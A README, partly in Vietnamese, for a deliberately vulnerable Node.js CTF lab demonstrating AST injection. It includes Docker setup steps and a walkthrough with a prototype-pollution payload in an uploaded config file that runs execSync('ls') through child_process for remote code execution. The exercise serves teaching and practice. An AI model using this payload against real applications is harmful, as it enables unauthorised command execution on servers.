# AST-injection-ctf
Demo AST injection in Nodejs app. <br/>
Docker and docker-compose required!

###### Build nodejs app image
`docker build -t demo-ctf .`<br/>
Ignore all the red line while build image :)))

###### Up docker-compose
`docker-compose up -d`

###### Run app
- Go to localhost:3000
- Reload until everything work correctly

## Try to RCE ^^

### Idea
Lướt qua các chức năng của trang web có thể rút ra được những điều như sau:
- Trang web được sử dụng cho các chức năng thống kê, vẽ biểu đồ
- Có 3 model chính là ransom, ransomware và victim
- Truy cập vào đường dẫn của từng model để kiểm tra chức năng, thấy được rằng 2 model ransomware và victim có chức năng xem chi tiết
- Kiểm tra chi tiết của 2 model, thấy rằng victim chỉ có thể download thông tin, còn ransomware có thể upload cấu hình mới lên để thực hiện update, có khả năng tải lên một file để khai thác lỗ hổng bảo mật
Quan sát tiếp source code của trang web ở đúng chức năng upload file cấu hình ransomware:
- Chức năng update được comment lại để bảo trì
```
var config = parse(req.file.buffer.toString());
// await Ransomware.update(config, { where: { id: req.params.id } })  // database locked for maintenance
res.redirect('/ransomware/' + req.params.id);
```
- Nội dung file không được làm sạch trước khi thực thi ch

### Solutions
- Tạo file exploit với nội dung dưới đây và lưu lại
```
test = 'Hey universe'
      
[__proto__.someprop]
name = "somename"
value = "somevalue"
code = "process.mainModule.require('child_process').execSync('ls')"
```
- Vào trang chi tiết của 1 ransomware bất kỳ, upload file exploit vừa tạo lên
- Kiểm tra source của trang mới, thấy rằng có thuộc someprop ở các thẻ có giá trị là kết quả của câu lệnh 'ls' được inject ở trong file exloit
